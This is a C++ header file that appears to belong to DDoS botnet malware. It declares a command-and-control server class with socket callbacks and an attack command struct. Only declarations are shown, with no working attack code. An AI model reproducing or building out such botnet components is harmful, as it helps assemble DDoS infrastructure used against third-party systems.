
#ifndef _DDOS_CNCSERVER_H
#define _DDOS_CNCSERVER_H


typedef struct{
	uint8_t type;
	uint8_t param_cnt;

}attack_cmd_t;

class CCncServer {
public:
	CCncServer(uint32_t ipaddr, uint16_t port);
	virtual ~CCncServer();

public:
	int start();
	void stop();
	void destroy();
	bool is_stopped();

public:
	static void on_write(int32_t fd, void* param1);
	static void on_recv(int fd, void *param1, struct sockaddr *cliAddr, char *recvBuf, int recvLen);
	static void expire_handle(void* param1, void* param2, void* param3, void* param4);
private:
	void establish_serv();
	void close_serv();

private:
	int m_fd_serv;
	uint32_t m_srv_ip;
	uint16_t m_srv_port;

	bool m_pendinng;
	uint64_t m_pending_time;

	char m_recv_buf[1024];
	uint32_t m_recv_len;
};

extern CCncServer *g_cncServer;

#endif